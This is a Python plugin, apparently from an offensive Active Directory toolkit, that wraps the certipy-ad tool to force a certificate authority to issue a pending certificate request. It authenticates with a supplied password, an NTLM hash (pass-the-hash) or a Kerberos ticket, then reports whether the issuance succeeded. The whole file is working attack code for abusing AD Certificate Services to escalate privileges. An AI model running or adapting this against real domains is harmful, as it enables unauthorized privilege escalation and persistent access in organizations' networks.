import subprocess
import os


def run(data, cred, args):
    extra = getattr(args, "extra", []) or []

    # -------------------------
    # Input
    # -------------------------
    if len(extra) < 1:
        print("[-] Missing request ID")
        return {"success": False}

    request_id = extra[0]

    domain = data.get("domain")
    dc_ip = data.get("ip")
    ca = data.get("adcs", {}).get("ca")

    if not domain or not dc_ip or not ca:
        print("[-] Missing domain, DC IP, or CA name")
        return {"success": False}

    username = cred.get("user")
    typ = cred.get("type")
    secret = cred.get("secret")

    if not username:
        print("[-] Missing username in credential")
        return {"success": False}

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
        "certipy-ad", "ca",
        "-ca", ca,
        "-dc-ip", dc_ip,
        "-issue-request", str(request_id),
        "-u", f"{username}@{domain}"
    ]

    env = os.environ.copy()

    # -------------------------
    # Auth handling
    # -------------------------
    if typ == "password":
        cmd += ["-p", secret]

    elif typ == "ntlm":
        ntlm = secret if ":" in secret else f":{secret}"
        cmd += ["-hashes", ntlm]

    elif typ == "ticket":
        env["KRB5CCNAME"] = secret
        cmd += ["-k", "-no-pass"]

    else:
        print("[-] Unsupported credential type")
        return {"success": False}

    cmd += ["-debug"]
    cmd = [str(x) for x in cmd]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute
    # -------------------------
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            env=env
        )
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return {"success": False}

    output = result.stdout + result.stderr
    print(output)

    # -------------------------
    # Success detection
    # -------------------------
    success = (
        "issued" in output.lower() or
        "success" in output.lower()
    )

    if success:
        print(f"[+] Request {request_id} approved")

    return {
        "success": success,
        "output": output,
        "request_id": request_id
    }